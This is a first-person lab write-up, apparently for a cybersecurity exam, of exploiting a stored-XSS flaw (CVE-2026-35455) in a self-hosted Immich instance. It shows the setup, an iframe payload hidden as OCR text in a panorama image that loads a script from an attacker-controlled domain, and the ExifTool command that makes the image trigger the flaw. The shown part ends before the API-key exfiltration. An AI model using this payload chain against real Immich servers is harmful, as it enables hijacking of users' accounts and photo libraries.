# Immich exfiltration demo
This report describes how I exploited CVE-2026-35455 to achieve account hijacking and persistent unauthorized access to an Immich self-hosted instance.
All the files used are published in [this repo](https://github.com/emanuelepns/immich-exfiltration-demo).
A [video](https://mnlpns.it) of the execution is also available.
## Introduction
Immich is a self-hosted photo and video management solution that you can easily deploy on your own server. I have been using it regularly from a year, and on May 2026 while looking for some ideas for a demo for the Cybersecurity exam, I found this interesting vulnerability.
The [CVE-2026-35455](https://github.com/immich-app/immich/security/advisories/GHSA-9qx4-67jm-cc66) allows an attacker to execute arbitrary JavaScript code extracted by OCR from an image. You can find a more detailed description [here](https://aisafe.io/blog/cve-2026-35455-immich-stored-xss-panorama-ocr). 
What made me curious is that the malicious initial payload is an image, in particular the text in that image. The file itself doesn't look suspicious and doesn't trigger any antivirus or malware alerts (verified on [VirusTotal](https://www.virustotal.com/gui/file/2da60eb54d179758a8ba453be43677beeb0327934f874e1eb3354979f4709a9a)). 
The objective of this demo was suggested by the security advisory, which states *"session hijacking (via persistent API key creation)"*. After trying the exploit with the provided [test image](https://github.com/emanuelepns/immich-exfiltration-demo/blob/main/images/test.jpg), I built my idea: edit an image by adding a text that triggers a script loaded from an external source, which scope is to create and exfiltrate an api key; then I could use that key to interact with [Immich APIs](https://api.immich.app/), gaining full control of the app.
## Setup
Before diving into the actual execution, let's take a look at the environment configuration. My goal is to show the infrastructure used rather than giving a line-by-line command list, demonstrating how I replicated a realistic, cloud-based scenario instead of a simple local simulation.
## Infrastructure
As server I deployed two separate instances on Oracle Cloud (using the [Free Tier](https://www.oracle.com/it/cloud/free/)):
- **Victim instance**: hosts Immich app;
- **Attacker instance**: hosts the malicious script and catches the exfiltrated api key.

Both were set up with a [minimal version](https://wiki.ubuntu.com/Minimal) of Ubuntu 24.04.4 LTS.
For the domains, I decided to use a dedicated subdomain under my personal domain for the victim machine (immich.mnlpns.it), and a free subdomain obtained via [FreeDNS](https://freedns.afraid.org/) for the attacker (u.photo-frame.com).

To ensure a production-like setup, I installed [Caddy](https://caddyserver.com/) as a reverse proxy on both machines as it manages the SSL certificates automatically with just a two line configuration. This step was crucial because unencrypted HTTP traffic is often rejected or restricted, making a valid HTTPS setup necessary for the exploit chain to succeed seamlessly.
### Immich setup
The victim environment was deployed following the official [Docker Compose install guide](https://docs.immich.app/install/docker-compose/) (files attached in my repo). To ensure the assessment remained as close as possible to an out-of-the-box installation, I left unaltered the configuration with only two exceptions in environment variables:
1. Application version was pinned to the vulnerable release `v2.6.3`;
2. Database password was changed as recommended.

During the initial onboarding, Immich requires the creation of a primary user account, which is automatically granted full administrative privileges, as stated in the little box you can see in the following image.
![](attachments/Pasted%20image%2020260520190228.png)

While this streamlines the initial setup process, in my opinion it introduces a flaw regarding the Principle of Least Privilege: administrative accounts should strictly be used for infrastructure management while daily activities should be performed by unprivileged users. The setup documentation and wizard fail to inform the user about the security implications of this, and usually who installs this kind of self-hosted software frequently follows a "line-by-line" guide without knowing what they are doing nor the underlying risks.
## Execution
### Malicious image
The first thing to do was creating the initial payload. The vulnerability resides in the application's panorama photo viewer, so an asset that triggers it is needed. The image requires:
1. High-resolution, wide-aspect-ratio;
2. EXIF [`GPano`](https://developers.google.com/streetview/spherical-metadata?hl=it) metadata tags.

To built it I sourced a photo from [Unsplash](https://unsplash.com/it) and then edited using [GIMP](https://www.gimp.org/). A real attacker would have hided the text better, for example inserting it in a road sign, or looking for the OCR contrast limits, but this is just a demo, so I added a text in a clear area, hiding the following code inside a fake link:
```html
<iframe srcdoc="<script src='https://u.photo-frame.com/tomas.js'></script>">
```
I put some `/` to avoid leaving spaces, that could break the OCR or give suspects, as they are accepted as separators by browsers as well.
After exporting it I added the metadata, using [ExifTool](https://exiftool.org/), with the command
```bash
$ exiftool \
  -XMP-gpano:ProjectionType="equirectangular" \
  -XMP-gpano:UsePanoramaViewer="True" \
  -XMP-gpano:FullPanoWidthPixels=12000 \
  -XMP-gpano:FullPanoHeightPixels=6000 \
  -XMP-gpano:CroppedAreaImageWidthPixels=12000 \
  -XMP-gpano:CroppedAreaImageHeightPixels=6000 \
  -XMP-gpano:CroppedAreaLeftPixels=0 \
  -XMP-gpano:CroppedAreaTopPixels=0 \
  tomas-cocacola-4AxeQEi0gQc-unsplash.jpg
```
At this point the [file](https://github.com/emanuelepns/immich-exfiltration-demo/blob/main/images/tomas-cocacola-4AxeQEi0gQc-unsplash.jpg) is ready to be uploaded in the Immich library and tested: it correctly opens in the panorama viewer and after triggering the OCR overlay (the `T` button in the bottom right corner) the `iframe` in the previous code is correctly rendered (you can look at it inspecting the page).
![](attachments/Pasted%20image%2020260520205010.png)